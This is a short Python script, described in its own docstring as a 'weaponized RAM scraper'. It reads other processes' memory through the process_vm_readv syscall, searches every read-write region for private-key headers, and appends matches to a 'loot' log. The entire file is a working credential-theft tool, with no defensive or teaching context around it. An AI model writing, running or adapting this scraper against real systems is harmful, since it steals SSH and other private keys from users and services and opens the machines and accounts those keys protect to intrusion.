import os
import sys
import re
import ctypes

# Import process_vm_readv from libc
libc = ctypes.CDLL("libc.so.6")

def scrape_process_memory(pid, pattern_regex):
    """
    Weaponized RAM Scraper: Uses process_vm_readv to read another 
    process's memory space without attaching a debugger (ptrace).
    """
    print(f"[*] Targeting PID: {pid}")
    
    # Locate memory maps for the target process
    maps_path = f"/proc/{pid}/maps"
    if not os.path.exists(maps_path):
        print(f"[-] PID {pid} not found.")
        return

    try:
        with open(maps_path, 'r') as f:
            for line in f:
                # We only care about readable, heap/stack/anon regions
                if 'rw' in line:
                    parts = line.split()
                    addr_range = parts[0].split('-')
                    start = int(addr_range[0], 16)
                    end = int(addr_range[1], 16)
                    size = end - start
                    
                    # Allocate local buffer
                    buffer = ctypes.create_string_buffer(size)
                    
                    # Setup iovec structures for process_vm_readv
                    local_iov = (ctypes.c_void_p * 2)(ctypes.addressof(buffer), size)
                    remote_iov = (ctypes.c_void_p * 2)(start, size)
                    
                    # Syscall 310 (process_vm_readv)
                    nread = libc.syscall(310, pid, local_iov, 1, remote_iov, 1, 0)
                    
                    if nread > 0:
                        matches = pattern_regex.findall(buffer.raw)
                        if matches:
                            print(f"[!!!] FOUND {len(matches)} matches in PID {pid}")
                            # Log to project loot
                            loot_path = "../../../loot/memory_harvest.log"
                            with open(loot_path, "ab") as log:
                                for m in matches:
                                    log.write(f"[PID:{pid}] ".encode() + m + b"\n")

    except Exception as e:
        print(f"[-] Memory Access Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 178_ram_scraper <pid>")
        sys.exit(1)
    
    # Pattern for potential private keys or high-entropy strings
    ssh_key_pattern = re.compile(b"-----BEGIN [A-Z ]+ PRIVATE KEY-----")
    scrape_process_memory(int(sys.argv[1]), ssh_key_pattern)
